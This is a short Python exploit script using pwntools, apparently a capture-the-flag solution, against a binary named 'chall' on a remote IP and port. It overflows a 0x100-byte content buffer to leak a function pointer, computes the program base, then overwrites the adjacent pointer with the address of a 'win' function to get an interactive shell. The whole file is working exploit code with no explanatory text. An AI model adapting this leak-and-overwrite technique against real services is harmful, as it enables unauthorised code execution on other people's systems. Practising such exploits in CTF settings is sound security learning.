from pwn import *

elf = ELF('./chall')
p = remote('152.118.201.241', 3022)

def menu(c):
    p.sendlineafter(b">> ", str(c).encode())

def edit(size, data):
    menu(3)
    p.sendlineafter(b"Enter new content length: ", str(size).encode())
    p.sendafter(b"New content: ", data)

# === LEAK ===
payload = b"A"*0x100
edit(0x100, payload)

menu(1)

p.recvuntil(b"A"*0x100)
leak = p.recv(6)
leak = u64(leak.ljust(8, b'\x00'))

log.info(f"leak = {hex(leak)}")

base = leak - elf.symbols['print_note']
win = base + elf.symbols['win']

log.info(f"base = {hex(base)}")
log.info(f"win = {hex(win)}")

# === EXPLOIT ===
payload = b"/bin/sh\x00"
payload = payload.ljust(0x100, b"A")
payload += p64(win)

edit(len(payload), payload)
menu(0)

p.interactive()